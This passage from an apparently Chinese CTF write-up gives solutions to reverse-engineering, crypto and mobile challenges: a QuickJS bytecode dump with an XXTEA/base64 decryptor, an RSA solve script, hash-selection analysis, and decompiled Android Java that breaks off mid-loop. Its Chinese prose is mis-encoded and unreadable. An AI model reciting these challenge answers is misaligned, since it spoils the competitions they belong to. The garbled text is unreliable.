0x66, 0x77, 0x64, 0x65, 0x72, 0x66, 0x0A, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x18, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x3A, 0x20, 0x20, 0x6E, 0x6F, 0x5F, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x5F, 0x69, 0x73, 0x5F, 0x74, 0x72, 0x75, 0x65, 0x0E, 0x64, 0x66, 0x64, 0x66, 0x77, 0x66, 0x33, 0xE0, 0x01, 0x30, 0x35, 0x61, 0x65, 0x64, 0x30, 0x63, 0x65, 0x34, 0x34, 0x31, 0x66, 0x38, 0x30, 0x62, 0x35, 0x62, 0x63, 0x33, 0x36, 0x61, 0x66, 0x34, 0x63, 0x36, 0x39, 0x38, 0x35, 0x30, 0x39, 0x66, 0x63, 0x36, 0x63, 0x63, 0x33, 0x63, 0x39, 0x37, 0x31, 0x34, 0x36, 0x33, 0x35, 0x33, 0x64, 0x65, 0x35, 0x61, 0x39, 0x35, 0x63, 0x36, 0x61, 0x62, 0x65, 0x61, 0x30, 0x37, 0x66, 0x64, 0x34, 0x61, 0x37, 0x30, 0x37, 0x30, 0x39, 0x33, 0x32, 0x64, 0x38, 0x36, 0x61, 0x63, 0x33, 0x32, 0x64, 0x36, 0x32, 0x38, 0x36, 0x37, 0x32, 0x61, 0x35, 0x39, 0x31, 0x32, 0x33, 0x65, 0x35, 0x39, 0x37, 0x32, 0x33, 0x33, 0x31, 0x64, 0x62, 0x35, 0x64, 0x66, 0x66, 0x65, 0x37, 0x30, 0x35, 0x37, 0x33, 0x36, 0x32, 0x06, 0x79, 0x65, 0x73, 0x0E, 0x00, 0x06, 0x00, 0xA0, 0x01, 0x00, 0x01, 0x00, 0x03, 0x00, 0x08, 0xE4, 0x01, 0x01, 0xA2, 0x01, 0x00, 0x00, 0x00, 0x3F, 0xE1, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE2, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE3, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE4, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE5, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE6, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE7, 0x00, 0x00, 0x00, 0x40, 0x3F, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x40, 0xE1, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x01, 0x40, 0xE2, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x02, 0x40, 0xE3, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x03, 0x40, 0xE4, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x04, 0x40, 0xE5, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x05, 0x40, 0xE6, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x07, 0x40, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x3E, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x04, 0xE9, 0x00, 0x00, 0x00, 0x15, 0x43, 0xEA, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0xC0, 0x06, 0x15, 0x43, 0xEB, 0x00, 0x00, 0x00, 0xC9, 0x06, 0xC9, 0x37, 0xEC, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x1D, 0x38, 0xEC, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE8, 0x00, 0x00, 0x00, 0x42, 0xED, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0xC9, 0xEC, 0x25, 0x06, 0xC9, 0x37, 0x4D, 0x00, 0x00, 0x00, 0xF4, 0xEB, 0x0F, 0x38, 0x4D, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0xEC, 0x0D, 0x04, 0xEE, 0x00, 0x00, 0x00, 0x11, 0x39, 0xE8, 0x00, 0x00, 0x00, 0xC9, 0x38, 0xE7, 0x00, 0x00, 0x00, 0x38, 0xE8, 0x00, 0x00, 0x00, 0xEF, 0xCD, 0x28, 0xDE, 0x03, 0x01, 0x13, 0xF1, 0x00, 0x3E, 0xB0, 0x01, 0x58, 0x00, 0x05, 0x36, 0x00, 0x09, 0x40,0x35, 0x3F, 0x49, 0x3F, 0x3F, 0x0D, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC2, 0x03, 0x02, 0x03, 0x02, 0x09, 0x00, 0x01, 0x6E, 0x05, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xE4, 0x03, 0x00, 0x00, 0x00, 0xE6, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0xD1, 0xC5, 0xB6, 0x9E, 0x47, 0xBF, 0x00, 0xAD, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x3B, 0xD1, 0xC7, 0x71, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xD1, 0xC7, 0x47, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x08, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x10, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0xD1, 0xC7, 0x47, 0xBD, 0x18, 0xA2, 0xBE, 0xFF, 0x00, 0xAD, 0x24, 0x04, 0x00, 0x49, 0x93, 0x02, 0xEC, 0xC2, 0xD2, 0xEA, 0x15, 0xD1, 0x42, 0x5B, 0x00, 0x00, 0x00, 0xC1, 0x24, 0x01, 0x00, 0x42, 0xF6, 0x00, 0x00, 0x00, 0xB5, 0xC6, 0x25, 0x02, 0x00, 0xD1, 0x42, 0x5B, 0x00, 0x00, 0x00, 0xC1, 0x25, 0x01, 0x00, 0xDE, 0x03, 0x01, 0x0B, 0x03, 0x12, 0x30, 0x27, 0x67, 0x35, 0x35, 0x49, 0x17, 0x12, 0x69, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC4, 0x03, 0x02, 0x03, 0x02, 0x07, 0x00, 0x00, 0x5D, 0x05, 0xEE, 0x03, 0x00, 0x01, 0x00, 0xE2, 0x03, 0x00, 0x01, 0x00, 0xF0, 0x03, 0x00, 0x00, 0x00, 0xE0, 0x03, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xD1, 0xE9, 0xC9, 0x26, 0x00, 0x00, 0xCA, 0xB5, 0xCB, 0xC7, 0xC5, 0xA3, 0xEA, 0x46, 0xC6, 0xC7, 0xB7, 0xA1, 0x71, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB6, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x08, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB7, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x10, 0xA0, 0xAF, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0xB8, 0x9D, 0x24, 0x01, 0x00, 0xBD, 0x18, 0xA0, 0xAF, 0x49, 0xB9, 0x94, 0x02, 0xEC, 0xB7, 0xD2, 0xEA, 0x06, 0xC6, 0xC6, 0xE9, 0xC5, 0x49, 0xC6, 0x28, 0xDE, 0x03, 0x13, 0x0B, 0x03, 0x12, 0x17, 0x27, 0x4E, 0x53, 0x53, 0x58, 0x1C, 0x12, 0x1D, 0x0E, 0x43, 0x06, 0x00, 0xC6, 0x03, 0x02, 0x0B, 0x02, 0x06, 0x00, 0x04, 0xF8, 0x01, 0x0D, 0xF4, 0x03, 0x00, 0x01, 0x00, 0xF6, 0x03, 0x00, 0x01, 0x00, 0xE0, 0x03, 0x00, 0x00, 0x00, 0xF8, 0x03, 0x00, 0x01, 0x00, 0xFA, 0x03, 0x00, 0x02, 0x00, 0xFC, 0x03, 0x00, 0x03, 0x00, 0xFE, 0x03, 0x00, 0x04, 0x00, 0x80, 0x04, 0x00, 0x05, 0x00, 0x82, 0x04, 0x00, 0x06, 0x00, 0x84, 0x04, 0x00, 0x07, 0x00, 0x86, 0x04, 0x00, 0x08, 0x00, 0x88, 0x04, 0x00, 0x09, 0x00, 0x8A, 0x04, 0x00, 0x0A, 0x00, 0xD1, 0xC1, 0xA9, 0xEA, 0x03, 0xC1, 0x28, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD1, 0x0A, 0xF0, 0xC9, 0x38, 0xE2, 0x00, 0x00, 0x00, 0xD2, 0x09, 0xF0, 0xCA, 0xC5, 0xE9, 0xB6, 0x9E, 0xCB, 0xC5, 0xC7, 0x47, 0xCC, 0xC5, 0xB5, 0x47, 0xC3, 0x04, 0xBF, 0x00, 0xC3, 0x05, 0x38, 0x9D, 0x00, 0x00, 0x00, 0x42, 0x06, 0x01, 0x00, 0x00, 0xBB, 0xBD, 0x34, 0xC7, 0xB6, 0x9D, 0x9B, 0x9D, 0x24, 0x01, 0x00, 0xC3, 0x08, 0xB5, 0xC3, 0x09, 0xC2, 0x08, 0x90, 0xC3, 0x08, 0xB5, 0xA5, 0x69, 0x9B, 0x00, 0x00, 0x00, 0xC2, 0x09, 0xC2, 0x05, 0x9D, 0xBF, 0x01, 0xAD, 0xC4, 0x09, 0xB7, 0xA2, 0xB8, 0xAD, 0xC3, 0x07, 0xB5, 0xC3, 0x0A, 0xC2, 0x0A, 0xC7, 0xA3, 0xEA, 0x43, 0xC5, 0xC2, 0x0A, 0xB6, 0x9D, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC2, 0x0A, 0x71, 0xC5, 0xC2, 0x0A, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x02, 0xAD, 0x16, 0x49, 0xCC, 0x93, 0x0A, 0xEC, 0xB9, 0xC5,0xB5, 0x47, 0xC3, 0x04, 0xC8, 0xBA, 0xA2, 0xC2, 0x04, 0xB7, 0xA0, 0xAE, 0xC2, 0x04, 0xB8, 0xA2, 0xC8, 0xB9, 0xA0, 0xAE, 0x9D, 0xC2, 0x09, 0xC2, 0x04, 0xAE, 0xC6, 0xC2, 0x0A, 0xB8, 0xAD, 0xC2, 0x07, 0xAE, 0x47, 0xC8, 0xAE, 0x9D, 0xAE, 0xC3, 0x06, 0xC5, 0xC7, 0x71, 0xC5, 0xC7, 0x47, 0xC2, 0x06, 0x9D, 0xBF, 0x03, 0xAD, 0x16, 0x49, 0xCC, 0xED, 0x5F, 0xFF, 0x38, 0xE4, 0x00, 0x00, 0x00, 0x38, 0xE1, 0x00, 0x00, 0x00, 0xC5, 0x09, 0xF0, 0x23, 0x01, 0x00, 0xDE, 0x03, 0x23, 0x15, 0x03, 0x1C, 0x08, 0x08, 0x30, 0x30, 0x1D, 0x44, 0x85, 0x3F, 0x35, 0x21, 0x30, 0x2B, 0xBC, 0x58, 0x17, 0x1C, 0xBC, 0x4E, 0x13, 0x06, 0x00, 0x00, 0x20, 0x37, 0xEF, 0xC6, 0xE3, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x06, 0x00, 0x00, 0xE0, 0xFF, 0xFF, 0xFF, 0xEF, 0x41, 0x0E, 0x43, 0x06, 0x00, 0xC8, 0x03, 0x01, 0x03, 0x01, 0x04, 0x00, 0x01, 0x32, 0x04, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0xE8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xC1, 0xCA, 0xB5, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC7, 0x91, 0xCB, 0x24, 0x01, 0x00, 0x42, 0x37, 0x00, 0x00, 0x00, 0xBD, 0x10, 0x24, 0x01, 0x00, 0xCE, 0xE9, 0xB6, 0xA9, 0xEA, 0x06, 0xBF, 0x00, 0xC6, 0x9D, 0xCA, 0xC6, 0x94, 0x00, 0xC7, 0xD1, 0xE9, 0xA3, 0xEB, 0xD7, 0xC5, 0x28, 0xDE, 0x03, 0x3E, 0x08, 0x03, 0x0D, 0x0D, 0x0E, 0x76, 0x35, 0x12, 0x21, 0x07, 0x02, 0x30, 0x0E, 0x43, 0x06, 0x00, 0xCA, 0x03, 0x01, 0x03, 0x01, 0x06, 0x00, 0x00, 0x52, 0x04, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0xE8, 0x03, 0x00, 0x01, 0x00, 0xF8, 0x03, 0x00, 0x02, 0x00, 0xC1, 0xC9, 0xB5, 0xCA, 0xC6, 0xD1, 0xE9, 0xA3, 0xEA, 0x47, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xB9, 0xA0, 0x38, 0x09, 0x01, 0x00, 0x00, 0xD1, 0x42, 0x0A, 0x01, 0x00, 0x00, 0xC6, 0x8F, 0xCE, 0xB6, 0x24, 0x02, 0x00, 0xBD, 0x10, 0xF0, 0xAF, 0xCF, 0xBE, 0xFF, 0x00, 0xAD, 0xCB, 0xC5, 0x38, 0x99, 0x00, 0x00, 0x00, 0x42, 0xF5, 0x00, 0x00, 0x00, 0xC7, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0x93, 0x01, 0xEC, 0xB5, 0xC5, 0x28, 0xDE, 0x03, 0x4A, 0x09, 0x03, 0x0D, 0x0D, 0x21, 0xDA, 0x21, 0x58, 0x0D, 0x0D, 0x0E, 0x43, 0x06, 0x00, 0xCC, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x29, 0xDE, 0x03, 0x56, 0x01, 0x03, 0x0E, 0x43, 0x06, 0x00, 0x00, 0x01, 0x09, 0x01, 0x04, 0x00, 0x00, 0xE6, 0x01, 0x0A, 0xB0, 0x01, 0x00, 0x01, 0x00, 0x8E, 0x04, 0x00, 0x00, 0x00, 0x90, 0x04, 0x00, 0x01, 0x00, 0x96, 0x04, 0x00, 0x02, 0x00, 0x98, 0x04, 0x00, 0x03, 0x00, 0x9A, 0x04, 0x00, 0x04, 0x00, 0x9C, 0x04, 0x00, 0x05, 0x00, 0x9E, 0x04, 0x00, 0x06, 0x00, 0xA0, 0x04, 0x00, 0x07, 0x00, 0xE8, 0x03, 0x00, 0x08, 0x00, 0xC1, 0xC9, 0xC1, 0xCC, 0xC1, 0xC3, 0x07, 0xB5, 0xC3, 0x08, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCA, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCB, 0xD1, 0x42, 0xF9, 0x00, 0x00, 0x00, 0xC2, 0x08, 0x91, 0xC3, 0x08, 0x24, 0x01, 0x00, 0xCC, 0xC6, 0xB7, 0xA1, 0xC3, 0x04, 0xC6, 0xB8, 0xAD, 0xB9, 0xA0, 0xC7, 0xB9, 0xA1, 0xAF, 0xC3, 0x05, 0xC7, 0xBD, 0x0F, 0xAD, 0xB7, 0xA0, 0xC8, 0xBB, 0xA1, 0xAF, 0xC3, 0x06, 0xC8, 0xBD, 0x3F, 0xAD, 0xC3, 0x07, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC7, 0xEF, 0xEA, 0x09, 0xBD, 0x40, 0xC4, 0x07, 0xC3, 0x06, 0xEC, 0x0E, 0x38, 0x11, 0x01, 0x00, 0x00, 0xC8, 0xEF, 0xEA, 0x05, 0xBD, 0x40, 0xC3, 0x07, 0xC5, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12,0x01, 0x00, 0x00, 0xC2, 0x04, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x05, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x06, 0x24, 0x01, 0x00, 0x9D, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x41, 0xEA, 0x00, 0x00, 0x00, 0x42, 0x12, 0x01, 0x00, 0x00, 0xC2, 0x07, 0x24, 0x01, 0x00, 0x9D, 0xC9, 0xC1, 0xD0, 0xCF, 0xCA, 0xC1, 0xC4, 0x07, 0xC4, 0x06, 0xC4, 0x05, 0xC3, 0x04, 0xC2, 0x08, 0xD1, 0xE9, 0xA3, 0x6A, 0x2A, 0xFF, 0xFF, 0xFF, 0xC5, 0x28, 0xDE, 0x03, 0x59, 0x18, 0x03, 0x0D, 0x0D, 0x12, 0x13, 0x4E, 0x4E, 0x4E, 0x1C, 0x3A, 0x3F, 0x21, 0x30, 0x21, 0x3A, 0x18, 0x08, 0x6C, 0x6C, 0x6C, 0x71, 0x17, 0x30, 0x35, 0x0E, 0x43, 0x06, 0x00, 0xCE, 0x03, 0x01, 0x04, 0x01, 0x04, 0x00, 0x00, 0x84, 0x01, 0x05, 0xD0, 0x03, 0x00, 0x01, 0x00, 0xB0, 0x01, 0x00, 0x00, 0x00, 0xA6, 0x04, 0x00, 0x01, 0x00, 0xA8, 0x04, 0x00, 0x02, 0x00, 0xAC, 0x01, 0x00, 0x03, 0x00, 0xD1, 0xE9, 0xB6, 0xA3, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x16, 0x01, 0x00, 0x00, 0xD1, 0xB5, 0x47, 0x9D, 0xEF, 0x0E, 0xD1, 0xB5, 0x47, 0xC9, 0x38, 0xE6, 0x00, 0x00, 0x00, 0x42, 0xEB, 0x00, 0x00, 0x00, 0xC5, 0x24, 0x01, 0x00, 0xCA, 0x04, 0x17, 0x01, 0x00, 0x00, 0x11, 0x39, 0x18, 0x01, 0x00, 0x00, 0x0E, 0x38, 0xE3, 0x00, 0x00, 0x00, 0xC6, 0x38, 0x18, 0x01, 0x00, 0x00, 0xF0, 0xCF, 0xE9, 0xBD, 0x70, 0xAA, 0xEA, 0x0D, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0x04, 0x19, 0x01, 0x00, 0x00, 0xCC, 0xC7, 0xC8, 0xA9, 0xEA, 0x0E, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0x1A, 0x01, 0x00, 0x00, 0xEF, 0x0E, 0x29, 0x38, 0x15, 0x01, 0x00, 0x00, 0x04, 0xEE, 0x00, 0x00, 0x00, 0xEF, 0x29, 0xDE, 0x03, 0x76, 0x11, 0x03, 0x21, 0x3B, 0x08, 0x54, 0x17, 0x4F, 0x3F, 0x40, 0x26, 0x3B, 0x09, 0x21, 0x1D, 0x3F, 0x09, 0x3C, 0x00, 0x00, 0x00, 0xDD, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; int main(int argc, char **argv) { JSRuntime *rt; JSContext *ctx; rt = JS_NewRuntime(); ctx = JS_NewContextRaw(rt); JS_SetModuleLoaderFunc(rt, NULL, js_module_loader, NULL); JS_AddIntrinsicBaseObjects(ctx); JS_AddIntrinsicDate(ctx); JS_AddIntrinsicEval(ctx); JS_AddIntrinsicStringNormalize(ctx); JS_AddIntrinsicRegExp(ctx); JS_AddIntrinsicJSON(ctx); JS_AddIntrinsicProxy(ctx); JS_AddIntrinsicMapSet(ctx); JS_AddIntrinsicTypedArrays(ctx); JS_AddIntrinsicPromise(ctx); JS_AddIntrinsicBigInt(ctx); js_std_add_helpers(ctx, argc, argv); js_std_eval_binary(ctx, qjsc_s, sizeof(qjsc_s), 0); js_std_loop(ctx); JS_FreeContext(ctx);JS_FreeRuntime(rt); return 0; } å†ç…§ä¸Šæ–‡ç¼–è¯‘å¹¶è¿è¡Œç¨‹åºï¼Œå³å¯å¾—åˆ°ä¸€æ®µæ¯”è¾ƒç›´è§‚çš„è¾“å‡º ç„¶åé€ä¸€åˆ†æè¿˜åŸæ–‡ä»¶ ç»è¿‡åˆ†æå¯ä»¥çŸ¥é“ å…ˆè¿›è¡Œäº†ä¸€ä¸ªbase64åŠ å¯† ç„¶åè¿›è¡Œäº†ä¸€ä¸ªxxtea base64æˆ‘ä»¬å¯ä»¥åœ¨è¡¨ä¸Šçœ‹åˆ° æœ‰ç¼–ç è¡¨ å½“å¾€ä¸‹åˆ†æåˆ° 0x9e3779b9å¾ˆæ˜æ˜¾å°±æ˜¯xxteaè§£å¯† è¿™æ—¶ æˆ‘ä»¬å°±å¯ä»¥ å…ˆç”¨xxteaè§£å¯† #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #define DELTA 0x9e3779b9 #define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { //uint32_t v[2]= {1,2}; //uint32_t const k[4]= {2,2,3,4}; int8_t cipher[] = {5, 174,208,206,68, 31,128,181, 188, 54, 175,76,105, 133,9,252,108,195,201,113,70,53,61, 229, 169, 92, 106,190, 160,127, 212, 167,7,9,50, 216, 106,195, 45,98, 134, 114, 165,145, 35,229,151,35, 49,219, 93,255,231,5,115,98}; const int8_t key[] =\"no_thing_is_true\"; uint32_t *v = (uint32_t *)cipher; const uint32_t *k =(const uint32_t *)key; int n= sizeof(cipher)/ sizeof(uint32_t); //nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯† // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ // printf(\"åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š%u %u\\n\",v[0],v[1]); // btea(v, n, k); // printf(\"åŠ å¯†åçš„æ•°æ®ï¼š%u %u\\n\",v[0],v[1]); btea(v, -n, k); // printf(\"è§£å¯†åçš„æ•°æ®ï¼š%u %u\\n\",v[0],v[1]); printf(\"%s\",cipher); printf(\"\\n\"); return 0; } ä¹‹åè¿›è¡Œbase64è§£å¯† å¾—çŸ¥flag cryptoæ‹Ÿæ€ç­¾åˆ°é¢˜ base64è§£ç å³å¯ onlyrsa æè¿°:RSA say : My birthday is in November instead of October è€ƒè™‘base=11ä¸‹çš„å¤šé¡¹å¼ï¼Œè·Ÿcryptoctf2020çš„decentRSAä¸€æ · å½“æ—¶æ²¡ç”µè„‘ï¼Œipadåšé¢˜â€¦åœ¨çº¿sageï¼š åˆ†è§£å‡ºä¸¤ä¸ªï¼Œåªæœ‰pæ˜¯ç´ æ•°ï¼Œç›´æ¥åœ¨Zmod(p)ä¸‹æ±‚è§£å³å¯ from libnum import * p=16249579302136675275737472669394168521026727339712083110552530420348131906271518040549529167354613121510156841352658645018277766962773342379074137176993546193979134201416444089373463960664685121485689105129185197998903479181913613273443541075619342246119648308939006396145123630152777688592984718084919469059 n=264048827496427248021277383801027180195275776366915828865010362454006394906519399441496561006668252031429735502465174250525698696973129422193405161920872162928097673289330345041221985548078586423910246601720647996170161319016119241836415788315729493164331517547663558380515400720081995290120793014108439083514403659082115510258023834737471488528527557960636984676435543300074504679264476413252780514962473070445293528877641502742438571110744667739728450283295649865745629276142949963507003094791773183928894536793857609738113546410753895719242547720815692998871947957214118354127328586542848234994500987288641595105 e=65537 c=76196483810925191371357319946893762223027002702624516192769497540954799651198719100683206759706879828894501526423422596543748404479640715319801018211652987852179907519286760601944889601355220646374788026632971331786307898234821477134265724962397355614076896148563340833323366935479885600112872998594315513803419069126624158092821269145991266528158747750965226483644012365861166608598063649804899693010576080857540523307078138634628539419178875838147396170651777949577793359622498517581948006585916952705460782942977789615065947303447566918741750017127110484065354974088489869377128636357092420660532261674969708694 phi=(p-1)*(q-1) phi=p-1 d=invmod(e, phi) m=pow(c,d,p) print(n2s(m)) mobilehahahaha8ä¸ªè¾“å…¥æ¡†ï¼Œåˆ†åˆ«è¾“å…¥8ä¸ª16è¿›åˆ¶æ•°ï¼ˆå¿…é¡»å¤§å†™ï¼‰ é¢˜ç›®é€»è¾‘ä¼šå°†å½“å‰è¾“å…¥çš„å­—ç¬¦ä¸²è½¬æ¢æˆ16è¿›åˆ¶æ•°å­—ï¼Œå¹¶ä¸”å–å‡ºå½“å‰æ¯ä¸ªæ•°å­—çš„æœ€é«˜bitä½œä¸ºä¸€ä¸ªç‰¹æ®Šçš„å¤„ç†å˜é‡ï¼ˆç”¨äºé€‰æ‹©hashç®—æ³•ï¼‰ å½“æœ€åä¸€ä¸ªæ•°å­—çš„æœ€é«˜bitä¸ä¸º1çš„æ—¶å€™ï¼Œä¼šé€‰æ‹©ä½¿ç”¨HMacSha256ä½œä¸ºhashæ‰‹æ³•ï¼Œä¸è¿‡æ­¤æ—¶çš„keyä¼šæœ‰æ‰€å·®å¼‚ å½“æœ€é«˜ä½ä¸º1çš„æ—¶å€™ï¼Œåˆ†åˆ«ä½¿ç”¨å¦‚ä¸‹çš„ç®—æ³•ï¼šswitch(signs &amp; 7)Case 5:SHA384Case 4:SHA256Case 3:SHA224Case 2:SHA1Case 1:MD5 ä½†æ˜¯å­˜åœ¨è¡¨æ›¿æ¢çš„æƒ…å†µCase 0:MD2 ä½†æ˜¯å­˜åœ¨è¡¨æ›¿æ¢çš„æƒ…å†µ åæ¥å‘ç°æ¼äº†ä¸€æ®µï¼Œåœ¨å‡½æ•°çš„æœ€å¼€å¤´ä¼šå°†å¯†é’¥ï¼ˆkeysï¼‰è®¡ç®—å…¶å¯¹åº”çš„MD5å­˜èµ·æ¥ï¼Œç„¶åä¼šå°†ä¸‹æ ‡signss^0xAB è€ƒè™‘åˆ°æœ€åè¾“å…¥ï¼Œä¼šå°†æˆ‘ä»¬çš„è¾“å…¥æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æ­¤æ—¶è¯´æ˜è¾“å…¥çš„æ•°ç»„å»æ‰æœ€é«˜ä½ä¹‹åï¼Œå¿…å®šæ˜¯å¯è§å­—ç¬¦ï¼ŒåŠ ä¸Šappä¸­æç¤ºäº†è¯´ä¸ä¼šå‡ºç°å°å†™å­—æ¯ï¼Œäºæ˜¯ç›´æ¥æŠŠjavaä»£ç æŠ å‡ºæ¥ï¼Œçˆ†ç ´å¯è§å­—ç¬¦å†™ä¸€ä¸ªçˆ†ç ´ç¨‹åºå³å¯å¾—åˆ°ç­”æ¡ˆã€‚ studydeské€†å‘ç›¸å…³é€»è¾‘ public class MainActivity$a implements View$OnClickListener { public MainActivity$a(MainActivity arg1) { this.b = arg1; super(); } public void onClick(View arg15) { String v11; BigDecimal v10; int v4_1; int v9; KeyListener v7; String v15 = this.b.o.getText().toString(); int v2 = 0x20; if(v15.length() != v2) { } else { byte[] v0 = class_a.arr; ByteArrayOutputStream v3 = new ByteArrayOutputStream(); StringBuilder v4 = new StringBuilder(); int v5 = v0.length; int v6 = 0; while(true) { v7 = null; if(v6 &lt; v5) { 